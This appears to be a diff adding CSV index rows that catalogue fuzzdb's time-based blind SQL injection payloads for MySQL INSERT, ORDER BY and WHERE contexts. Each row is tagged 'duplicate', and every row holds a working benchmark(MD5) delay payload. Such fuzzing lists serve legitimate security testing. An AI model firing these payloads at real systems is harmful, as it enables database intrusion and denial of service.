+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,42,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,43,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,44,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,45,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,46,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,47,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,48,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,49,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,50,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,51,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,52,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,53,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,54,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,55,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,56,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,57,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,58,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,59,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,60,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,61,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,62,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,63,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,64,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,65,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,66,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,67,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,68,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,69,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,70,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,71,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,72,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,73,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,74,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,75,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,76,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,77,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,78,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,79,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,80,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,81,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,82,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,83,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,84,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,85,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,86,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,87,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,88,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,89,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-INSERT.txt,90,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,1,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,2,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,3,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,4,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,5,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,6,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,7,""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,8,""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,9,""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,10,"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,11,"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,12,"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,13,"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,14,"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,15,"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,16,"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,17,"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-ORDER_BY.txt,18,"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,1," and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,2," and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,3," and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,4,"' and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,5,"' and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,6,"' and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,7,""" and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,8,""" and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,9,""" and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,10,") and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,11,") and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,12,") and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,13,")) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,14,")) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,15,")) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,16,"))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,17,"))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,18,"))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,19,")))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,20,")))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,21,")))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,22,"') and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,23,"') and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,24,"') and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,25,""") and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,26,""") and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,27,""") and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,28,"')) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,29,"')) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,30,"')) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,31,""")) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,32,""")) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,33,""")) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,34,"'))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,35,"'))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,36,"'))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,37,"""))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,38,"""))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,39,"""))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,40,"')))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,41,"')))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,42,"')))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,43,""")))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,44,""")))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt,45,""")))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
